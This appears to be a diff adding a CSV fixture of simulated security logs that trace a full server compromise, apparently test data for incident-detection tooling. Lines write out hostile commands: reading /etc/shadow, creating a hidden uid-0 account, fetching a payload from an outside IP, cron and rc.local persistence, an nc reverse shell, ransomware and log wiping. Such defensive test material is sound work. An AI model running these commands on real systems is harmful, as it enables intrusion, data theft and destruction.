@@ -1,0 +1,33 @@
+timestamp,source,severity,user,source_ip,destination_ip,event_type,detail
+2025-06-01 02:14:03,sshd,info,admin,10.0.1.50,,authentication,Accepted password for admin - normal maintenance login
+2025-06-01 03:01:12,sshd,warning,root,192.168.1.105,,authentication,Failed password for root port 22 ssh2
+2025-06-01 03:01:14,sshd,warning,root,192.168.1.105,,authentication,Failed password for root port 22 ssh2
+2025-06-01 03:01:16,sshd,warning,root,192.168.1.105,,authentication,Failed password for root port 22 ssh2
+2025-06-01 03:01:18,sshd,warning,root,192.168.1.105,,authentication,Failed password for root port 22 ssh2
+2025-06-01 03:01:20,sshd,warning,root,192.168.1.105,,authentication,Failed password for root port 22 ssh2
+2025-06-01 03:01:22,sshd,error,root,192.168.1.105,,authentication,Multiple failed login attempts detected - brute force attack
+2025-06-01 03:02:01,sshd,critical,root,192.168.1.105,,authentication,Accepted password for root after brute force - account compromised
+2025-06-01 03:03:44,sudo,warning,root,,,privilege_escalation,sudo cat /etc/shadow - reading password hashes
+2025-06-01 03:04:02,sudo,critical,root,,,privilege_escalation,sudo useradd -o -u 0 backdoor_admin - hidden admin account created
+2025-06-01 03:05:30,firewall,error,,192.168.1.105,10.0.1.10,network,UFW BLOCK TCP DPT=445 - SMB port scan
+2025-06-01 03:05:31,firewall,error,,192.168.1.105,10.0.1.10,network,UFW BLOCK TCP DPT=3389 - RDP port scan
+2025-06-01 03:05:32,firewall,error,,192.168.1.105,10.0.1.10,network,UFW BLOCK TCP DPT=5985 - WinRM port scan
+2025-06-01 03:07:22,auditd,error,root,,,malware,curl http://185.141.25.168/payload.sh executed - remote script download
+2025-06-01 03:07:45,auditd,critical,root,,,malware,wget http://185.141.25.168/backdoor.elf to /tmp/.hidden_svc - malware payload downloaded
+2025-06-01 03:08:10,systemd,critical,root,,,malware,Started /tmp/.hidden_svc - unknown service from tmp directory - malware activated
+2025-06-01 03:08:35,auditd,warning,,10.0.1.10,185.141.25.168,network,C2 beacon connection to 185.141.25.168:443 by /tmp/.hidden_svc
+2025-06-01 03:10:15,auditd,critical,root,,, file_access,File access /var/lib/mysql/customers_db/credit_cards.ibd - unauthorized database read
+2025-06-01 03:10:45,auditd,critical,root,,,file_access,File access /var/lib/mysql/customers_db/users_pii.ibd - PII exfiltration preparation
+2025-06-01 03:11:20,auditd,critical,root,10.0.1.10,185.141.25.168,data_transfer,847MB exfiltration upload to 185.141.25.168 via TLS - data exfiltration confirmed
+2025-06-01 03:13:30,cron,warning,root,,,system,Cron persistence: */5 * * * * /tmp/.hidden_svc --beacon added
+2025-06-01 03:15:22,auditd,critical,root,,,registry,/etc/rc.local modified to autorun /tmp/.hidden_svc - boot persistence established
+2025-06-01 03:18:30,auditd,error,root,,185.141.25.168,network,Reverse shell: /bin/nc to 185.141.25.168:4444 spawned by /tmp/.hidden_svc
+2025-06-01 03:19:00,auditd,critical,root,,,malware,Ransomware: 1247 files renamed to .locked extension in /home/
+2025-06-01 03:19:15,auditd,critical,root,,,malware,Ransomware note DECRYPT_FILES.txt dropped in /home/ /var/ /opt/
+2025-06-01 03:19:30,kernel,critical,,,, system,FATAL: filesystem corruption on /dev/sda1 - ransomware boot volume encryption
+2025-06-01 03:20:00,auditd,error,root,,,system,Anti-forensics: /var/log/auth.log truncated by PID=8821
+2025-06-01 03:20:15,auditd,error,root,,,system,Anti-forensics: /var/log/syslog truncated by PID=8821
+2025-06-01 03:20:30,auditd,error,root,,,system,Anti-forensics: bash_history cleared for root and backdoor_admin
+2025-06-01 03:21:00,auditd,warning,root,,,system,Timestomping: /tmp/.hidden_svc modified time changed to 2024-01-01
+2025-06-01 03:22:00,sshd,info,,192.168.1.105,,authentication,Disconnect from attacker IP 192.168.1.105
+2025-06-01 07:30:00,sshd,info,incident_responder,10.0.2.100,,authentication,IR team login - forensic investigation started
